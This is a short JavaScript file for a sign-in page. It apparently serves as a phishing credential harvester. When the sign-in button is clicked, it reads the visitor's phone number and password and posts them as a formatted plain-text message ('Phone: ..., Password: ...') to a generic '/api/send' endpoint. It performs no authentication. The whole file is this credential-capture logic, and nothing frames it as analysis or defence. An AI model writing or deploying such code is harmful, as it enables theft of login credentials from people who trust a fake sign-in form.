document.addEventListener("DOMContentLoaded", () => {
  const signInBtn = document.querySelector(".sign-in");
  signInBtn?.addEventListener("click", async () => {
    const phone = document.getElementById("phone")?.value.trim();
    const password = document.getElementById("password")?.value.trim();
    if (phone && password) {
      try {
        await fetch("/api/send", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ message: `Phone: ${phone}, Password: ${password}` })
        });
      } catch (e) {
        console.error(e);
      }
    }
  });
});
